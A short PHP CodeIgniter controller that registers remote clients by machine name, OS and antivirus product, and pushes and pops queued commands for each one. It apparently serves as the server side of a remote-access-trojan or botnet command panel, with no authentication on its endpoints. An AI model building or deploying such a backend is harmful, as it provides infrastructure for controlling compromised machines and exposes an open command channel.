<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Database_test extends CI_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/user_guide/general/urls.html
	 */
	public function index() {

		echo json_encode($this->Database->clients_list());
	}
	public function insert($cid, $user_name = '', $pc_name = '', $os_description = '', $av_name = '', $version = '') {

		echo ($this->Database->clients_insert($cid, $user_name, $pc_name, $os_description, $av_name, $version));
	}

	public function update($cid, $user_name = '', $pc_name = '', $os_description = '', $av_name = '', $version = '') {

		echo ($this->Database->clients_update($cid, $user_name, $pc_name, $os_description, $av_name, $version));
	}

	public function push($cid, $cmd_data = '') {

		echo ($this->Database->clients_push_command($cid, $cmd_data));
	}

	public function pop($cid, $seen = 'true') {

		echo $this->Database->clients_pop_command($cid, $seen == 'true')->command_data;
	}

}
